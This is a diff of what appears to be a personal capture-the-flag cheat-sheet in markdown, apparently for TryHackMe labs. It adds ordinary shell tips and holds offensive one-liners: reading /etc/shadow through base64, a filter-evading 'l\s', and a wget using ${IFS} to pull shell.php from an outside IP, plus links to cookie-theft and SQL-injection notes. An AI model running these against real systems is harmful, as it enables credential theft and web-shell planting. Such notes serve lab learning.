@@ -21,14 +21,19 @@ EOF
 
 
 #### Read file:
-```python
+```
 xxd -r file.txt 
 base64 /etc/shadow | base64 -d
 ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
-```
-```
+
 `l\s`: Equivalent to `ls`
 `wget${IFS}http://10.8.50.72:8000/shell.php`
+
+cat ./-
+
+file */{.,}* #every type of file in folder
+du -b -a | grep 1033 #size of file
+sort data.txt | uniq -u #uniq lines
 ```
 
 #### if command to long
@@ -202,6 +207,10 @@ search with '.*'
 ────────────────────────────────────────────
 ────────────────────────────────────────────
 ────────────────────────────────────────────
+```
+#### mv multiple files
+```
+mv -t DESTINATION file1 file2 file3
 ```
 #### [steal admin cookie/sqli](marketplace.md) (tryhackme:marketplace)
 #### [ohmyweb](omyweb.md)
